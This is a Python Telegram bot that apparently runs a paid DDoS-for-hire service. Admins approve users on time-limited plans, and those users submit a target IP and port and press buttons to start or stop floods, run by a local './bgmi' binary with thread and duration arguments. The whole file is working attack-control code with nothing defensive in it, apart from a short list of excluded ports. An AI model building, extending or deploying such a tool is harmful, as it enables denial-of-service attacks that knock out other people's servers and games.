import time
import requests
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import subprocess
from datetime import datetime, timedelta

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'
USER_ATTACK_FILE = "user_attack_details.json"
LOG_FILE = "log.txt"

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Load existing attack details from the file
def load_user_attack_data():
    if os.path.exists(USER_ATTACK_FILE):
        with open(USER_ATTACK_FILE, "r") as f:
            return json.load(f)
    return {}

# Save attack details to the file
def save_user_attack_data(data):
    with open(USER_ATTACK_FILE, "w") as f:
        json.dump(data, f)

# Initialize the user attack details
user_attack_details = load_user_attack_data()

# Initialize active attacks dictionary
active_attacks = {}

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED TO USE THIS ⚠*", parse_mode='Markdown')

# Run attack command synchronously
def run_attack_command_sync(target_ip, target_port, action):
    if action == 1:
        process = subprocess.Popen(["./bgmi", target_ip, str(target_port), "1", "70"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        active_attacks[(target_ip, target_port)] = process.pid
    elif action == 2:
        pid = active_attacks.pop((target_ip, target_port), None)
        if pid:
            try:
                # Kill the process
                subprocess.run(["kill", str(pid)], check=True)
            except subprocess.CalledProcessError as e:
                print(f"Failed to kill process with PID {pid}: {e}")

# Inline Buttons
btn_attack = telebot.types.InlineKeyboardButton("Save Attack ⚡", callback_data="attack")
btn_start = telebot.types.InlineKeyboardButton("Start Attack 🚀", callback_data="start")
btn_stop = telebot.types.InlineKeyboardButton("Stop Attack 🔴", callback_data="stop")

# Initial keyboard
initial_keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
initial_keyboard.add(btn_attack, btn_start, btn_stop)

# File to store command logs
LOG_FILE = "log.txt"

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")  

# Start and setup commands
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_approval(user_id):
        send_not_approved_message(message.chat.id)
        return

    username = message.from_user.username
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"Please choose an option below to continue.")

    bot.send_message(message.chat.id, welcome_message, reply_markup=initial_keyboard)

@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return

        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown', reply_markup=initial_keyboard)
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

# Broadcast Command
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split(maxsplit=1)

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*YOU ARE NOT AUTHORIZED TO USE THIS ⚠.*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /broadcast <message>*", parse_mode='Markdown')
        return

    broadcast_msg = cmd_parts[1]

    # Send the message to all approved users
    for user in users:
        if user['plan'] > 0:
            try:
                bot.send_message(user['user_id'], broadcast_msg, parse_mode='Markdown')
            except telebot.apihelper.ApiException as e:
                logging.error(f"Failed to send message to user {user['user_id']}: {e}")

    bot.send_message(chat_id, "*Broadcast message sent to all approved users.*", parse_mode='Markdown', reply_markup=initial_keyboard)

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @SahilModzOwner"
    bot.send_message(message.chat.id, owner_message, reply_markup=initial_keyboard)

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*YOU ARE NOT AUTHORIZED TO USE THIS ⚠*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        users.append(user_info)
        save_users(users)

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users[:] = [user for user in users if user['user_id'] != target_user_id]
        save_users(users)

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown', reply_markup=initial_keyboard)

# Handle the IP and port input from the user
@bot.message_handler(func=lambda message: message.text == 'Save Attack ⚡')
def handle_attack_setup(message):
    chat_id = message.chat.id
    msg = bot.send_message(chat_id, "Please enter the target IP and port in this format: `IP PORT`")
    bot.register_next_step_handler(msg, save_ip_port)

def save_ip_port(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        ip_port = message.text.split()  # Split the input by space

        if len(ip_port) != 2:
            bot.send_message(chat_id, "Invalid format. Please enter the IP and port in the format: `IP PORT`")
            return

        target_ip, target_port = ip_port

        # Save the IP and port to user_attack_details
        user_attack_details[user_id] = [target_ip, target_port]
        save_user_attack_data(user_attack_details)

        bot.send_message(chat_id, f"Target IP and Port saved as: `{target_ip}:{target_port}`", parse_mode='Markdown', reply_markup=initial_keyboard)
    except ValueError:
        bot.send_message(chat_id, "Invalid format. Please enter a valid IP and port.", reply_markup=initial_keyboard)

# Function to start the attack
@bot.message_handler(func=lambda message: message.text == 'Start Attack 🚀')
def handle_start_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details
            if int(target_port) in blocked_ports:
                bot.send_message(chat_id, f"Port {target_port} is blocked and cannot be used for attacks.", parse_mode='Markdown', reply_markup=initial_keyboard)
                return

            bot.send_message(chat_id, f"*🚀⚡ ATTACK STARTED ⚡🚀*", parse_mode='Markdown', timeout=60, reply_markup=initial_keyboard)
            run_attack_command_sync(target_ip, target_port, action=1)
            bot.send_message(chat_id, f"*Attack Started On {target_ip}:{target_port}.*", parse_mode='Markdown', reply_markup=initial_keyboard)
        else:
            bot.send_message(chat_id, "No IP and port set. Please use the Attack button to set your target IP and port.", reply_markup=initial_keyboard)
    except Exception as e:
        bot.send_message(chat_id, f"*Failed to start attack: {str(e)}*", reply_markup=initial_keyboard)

# Function to stop the attack
@bot.message_handler(func=lambda message: message.text == 'Stop Attack 🔴')
def handle_stop_attack(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        attack_details = user_attack_details.get(user_id)
        if attack_details:
            target_ip, target_port = attack_details
            bot.send_message(chat_id, f"*🔴 ATTACK STOPPED 🔴*", parse_mode='Markdown', timeout=60, reply_markup=initial_keyboard)
            run_attack_command_sync(target_ip, target_port, action=2)
            bot.send_message(chat_id, f"*Attack Stopped On {target_ip}:{target_port}.*", parse_mode='Markdown', reply_markup=initial_keyboard)
        else:
            bot.send_message(chat_id, "*No active attack found. Please use the 'Start Attack 🚀' button to initiate an attack.*", reply_markup=initial_keyboard)
    except Exception as e:
        bot.send_message(chat_id, f"Failed to stop attack: {str(e)}", reply_markup=initial_keyboard)

# Handle inline keyboard callback
@bot.callback_query_handler(func=lambda call: True)
def handle_callback_query(call):
    try:
        chat_id = call.message.chat.id
        user_id = call.from_user.id

        if not check_user_approval(user_id):
            send_not_approved_message(chat_id)
            return

        if call.data == "attack":
            msg = bot.send_message(chat_id, "Please enter the target IP and port in this format: `IP PORT`")
            bot.register_next_step_handler(msg, save_ip_port)
        elif call.data == "start":
            attack_details = user_attack_details.get(user_id)
            if attack_details:
                target_ip, target_port = attack_details
                if int(target_port) in blocked_ports:
                    bot.send_message(chat_id, f"Port {target_port} is blocked and cannot be used for attacks.", parse_mode='Markdown')
                    return
                bot.send_message(chat_id, "*STARTED ENJOYr*", parse_mode='Markdown', reply_markup=initial_keyboard)
                run_attack_command_sync(target_ip, target_port, action=1)
                bot.send_message(chat_id, f"*Attack Started On {target_ip}:{target_port}.*", parse_mode='Markdown', reply_markup=initial_keyboard)
            else:
                bot.send_message(chat_id, "No IP and port set. Please use the Attack button to set your target IP and port.", reply_markup=initial_keyboard)
        elif call.data == "stop":
            attack_details = user_attack_details.get(user_id)
            if attack_details:
                target_ip, target_port = attack_details
                run_attack_command_sync(target_ip, target_port, action=2)
                bot.send_message(chat_id, f"*Attack Stopped On {target_ip}:{target_port}.*", parse_mode='Markdown', reply_markup=initial_keyboard)
            else:
                bot.send_message(chat_id, "*No active attack found. Please use the 'Start Attack 🚀' button to initiate an attack.*", reply_markup=initial_keyboard)

        bot.answer_callback_query(call.id)
    except Exception as e:
        bot.answer_callback_query(call.id, text=f"An error occurred: {str(e)}")
        logging.error(f"Error in callback query handler: {e}")

# Function to run the bot continuously
def run_bot():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=60)
        except Exception as e:
            logging.error(f"Bot polling failed: {str(e)}")
            time.sleep(15)  # Sleep before retrying to avoid rapid failures

# /logs command handler
@bot.message_handler(commands=['logs'])
def handle_logs(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*YOU ARE NOT AUTHORIZED TO USE THIS ⚠*", parse_mode='Markdown')
        return

    try:
        with open('bot.log', 'r') as f:
            logs = f.read()
            bot.send_message(chat_id, logs, reply_markup=initial_keyboard)
    except FileNotFoundError:
        bot.send_message(chat_id, "Log file not found.", reply_markup=initial_keyboard)
    except Exception as e:
        bot.send_message(chat_id, f"Error retrieving logs: {str(e)}", reply_markup=initial_keyboard)

# /clearlogs command handler
@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully"
        except FileNotFoundError:
            response = "Logs are already cleared."
    else:
        response = "Only Admin Can Run This Command."
    bot.reply_to(message, response) 

# /logs command handler
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in ADMIN_IDS:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found"
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)

# Main entry point
if __name__ == '__main__':
    try:
        run_bot()
    except KeyboardInterrupt:
        logging.info("Bot stopped by user.")